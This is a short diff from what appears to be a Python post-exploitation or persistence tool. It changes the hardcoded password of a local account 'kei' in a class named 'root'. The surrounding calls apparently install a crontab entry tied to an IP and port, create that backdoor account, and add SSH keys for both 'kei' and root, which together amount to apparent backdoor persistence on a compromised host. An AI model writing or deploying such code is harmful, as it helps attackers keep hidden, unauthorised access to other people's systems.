@@ -154,7 +154,7 @@ class root:
         self.port = port
 
         funcs().crontab(self.ip, self.port)
-        funcs().create_local_account('kei', 'ILikeYouSoMuch<3')
+        funcs().create_local_account('kei', 'B3-M1N3_1-L0v3-U-S0-MUCH-<3')
         funcs().add_ssh_key('kei', True)
         funcs().add_ssh_key('root', True)
 
